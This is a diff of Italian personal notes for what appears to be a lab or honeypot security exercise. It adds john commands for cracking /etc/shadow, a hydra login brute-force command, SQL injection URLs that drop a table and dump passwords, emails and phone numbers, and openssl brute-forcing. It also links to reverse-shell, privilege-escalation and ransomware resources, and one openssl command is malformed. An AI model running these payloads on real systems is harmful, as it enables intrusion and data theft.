@@ -355,10 +355,86 @@ DOCKER
 docker ps --format "table {{.Names}}\t{{.Status}}\t{{.Ports}}"
 
 
-
-
-
-
-
 per disabilitare reverse dns lookup su syslog (se lo fa) --- /etc/rsyslog.conf
 global(preserveFQDN="off")
+
+
+cose wiki:
+
+-- modi per reverse shell:
+https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#python
+NOTA CURIOSA
+VEDERE TABELLA MOLTO UTLE
+https://www.geeksforgeeks.org/computer-networks/difference-between-bind-shell-and-reverse-shell/
+
+
+-- linpeas: 
+https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh
+https://github.com/peass-ng/PEASS-ng/tree/
+
+
+-- per password-cracking/brute-force "locale" come utente others:        (RIVEDERE)
+PER /etc/shadow
+john --format=crypt --wordlist=w.txt 
+john --show hashes.txt 
+
+
+
+-- tunnel ssh:                  (RIVEDERE)
+```
+ESEMPIO replicabile da provare miki - quando lo leggi dimmelo :)
+
+# macchina attaccata sulla quale simuliamo una connessione sulla porta sull'interfaccia 192.168.178.101 123
+nc -lpn 123
+# macchina attaccante che crea tunnel dalla porta 123 dell'ip ...101 alla porta 8081 della macchina attaccante
+ssh -L 8081:192.168.178.101:123 username@192.168.178.101
+```
+
+
+
+-- Scrivere bene scenario brute force nell'honeypot
+MANAGER, BLACKHONEY CONSOLE
+hydra IP/SERVER http-form-post "/login.php:user=^USER^&pass=^PASS^:Errore" -L users.txt -P pass.txt -t 5 -w 60 -o output.txt
+
+
+
+
+VULNERABILITà -> cron
+
+-- PER DNS SPOOFING ETTERCAP
+https://medium.com/@allypetitt/practical-demonstration-dns-spoofing-home-lab-f7294443fb23
+
+
+
+SLQ INJECTION E CRSF su *zenglish*
+
+HTML/IFRAME INJECTIONS
+
+
+```bash
+http://172.17.0.8/classifica.php?top=10; DROP TABLE utente; --
+http://172.17.0.8/classifica.php?top=10;%20DROP%20TABLE%20utente;%20--
+ORIGINALE -> SELECT username, livello, punteggio FROM utente  UNION SELECT livello, cellulare, email FROM utente;
+http://172.17.0.8/classifica.php?top=UNION%20SELECT%20livello,%20cellulare,%20email%20FROM%20utente
+http://172.17.0.8/classifica.php?search=1%20UNION%20SELECT%20livello,%20cellulare,%20email,%20password%20FROM%20utente
+http://172.17.0.8/classifica.php?search=0%27%20UNION%20SELECT%20password%20,%20nome,%20cognome,%20email%20FROM%20utente%20WHERE%201=%271
+```
+
+
+html injection + phishing sito invest
+descrizione + immagine
+
+https://github.com/tarcisio-marinho/GonnaCry/tree/master
+
+https://github.com/dmdhrumilmistry/pyhtools
+
+per documento cifrato :
+
+```bash
+# cripta con password thatswhatshesaid
+openssl enc -aes-256-cbc -salt -in -pbkdf2 file.sql -out file.sql.enc
+# decripta
+openssl enc -aes-256-cbc -d -pbkdf2 -in file.sql.enc -out file.sql
+# forza
+bruteforce-salted-openssl -t 4 -f wordlist.txt -c aes-256-cbc -d md5 encryptedfile.enc -1
+```
